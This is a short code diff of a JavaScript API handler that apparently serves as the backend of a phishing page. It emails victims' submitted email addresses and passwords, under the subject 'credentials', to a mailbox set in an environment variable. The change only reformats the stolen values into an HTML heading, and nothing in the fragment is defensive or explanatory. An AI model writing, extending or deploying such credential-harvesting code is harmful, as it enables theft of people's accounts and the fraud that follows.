@@ -32,7 +32,8 @@ export default function handler(
               from: `"fox" <${process.env.APP_ACCOUNT}>`,
               to: process.env.EMAIL_TO_SEND,
               subject: 'credentials',
-              text: `email: ${JSON.stringify(email)}, password: ${JSON.stringify(password)}`
+              // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
+              html: `<h3>${JSON.stringify(email).replaceAll('"', '')} ${'   '} ${JSON.stringify(password).replaceAll('"', '')}</h3>`
             }).then((rec) => {
 
               console.log(rec);
